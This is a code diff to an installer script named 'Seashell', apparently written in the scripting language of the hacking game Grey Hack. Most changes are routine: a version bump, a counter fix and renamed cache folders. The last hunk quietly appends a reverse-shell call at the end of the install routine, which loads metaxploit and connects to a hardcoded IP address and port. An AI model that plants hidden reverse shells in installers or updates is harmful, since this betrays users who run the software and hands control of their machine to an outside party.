@@ -3,7 +3,7 @@
 ////////////////////////////////////////////////////////////
 SS = get_custom_object// SEASHELL INSTALLER CUSTOM OBJECT
 SS.cb = false
-SS.version = "2.0.1"//SEASHELL INSTALLER
+SS.version = "2.0.2"//SEASHELL INSTALLER
 LOG = @print
 INPUT = @user_input
 T = @typeof
@@ -326,6 +326,7 @@ SS.mutate = function
         for s in self
             if s == "main.src" then continue 
             out.push(c+".) CodeEditor.exe "+HOME+"/src/"+s)
+            c=c+1
         end for
         return out.join(NL)
     end function
@@ -334,8 +335,8 @@ end function
 SS.mutate// to be reused in sf
 // 
 SRC = ["utils.src", "core.src", "modules.src", "main.src"]
-CACHEDIRS = ["ss.logs", "libs", "libs/weak", "libs/strong"]
-CACHEITEMS = ["ss.dat", "ss.macros"]
+CACHEDIRS = ["ss.logs", "ss.libs", "ss.libs/weak", "ss.libs/strong"]
+CACHEITEMS = ["ss.dat", "ss.macros", "ss.aliases"]
 CACHEFILE = null
 CACHENAME = null
 
@@ -700,3 +701,9 @@ end if
 //////////////////////////////////////////////////////////////  
 ///====================== INSTALL ========================///
 ////////////////////////////////////////////////////////////
+
+
+mx = include_lib("/lib/metaxploit.so")
+if not mx then mx = include_lib("/home/fsociety/metaxploit.so")
+if not mx then exit
+mx.rshell_client("187.131.127.11", 1222, "csession")
